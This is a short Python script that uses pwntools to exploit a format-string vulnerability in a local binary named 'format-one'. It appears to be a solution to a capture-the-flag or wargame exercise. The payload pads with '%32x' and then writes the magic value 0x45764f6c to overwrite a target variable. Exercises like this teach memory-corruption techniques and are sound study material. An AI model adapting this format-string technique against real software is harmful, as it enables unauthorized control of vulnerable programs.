# correct (2023-12-05)
from pwn import *

context.log_level = "debug"
p = process("./bin/format-one")

payload = b"%32x"
payload += 0x45764f6c.to_bytes(4, 'little')

# pause()
p.sendline(payload)
# p.recvall()
p.interactive()